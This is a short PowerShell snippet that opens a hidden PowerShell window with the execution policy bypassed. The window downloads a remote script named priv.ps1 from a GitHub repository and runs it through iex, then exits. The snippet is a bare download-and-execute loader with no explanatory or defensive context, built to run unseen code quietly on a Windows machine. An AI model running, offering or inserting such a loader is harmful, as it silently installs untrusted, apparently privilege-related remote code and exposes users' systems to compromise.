Start-Process powershell.exe -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-Command',"Add-Type -AssemblyName System.Windows.Forms; `$c=(Invoke-WebRequest 'https://github.com/zold1337/toolsvip/raw/refs/heads/main/priv.ps1').Content; iex `$c"; 
exit
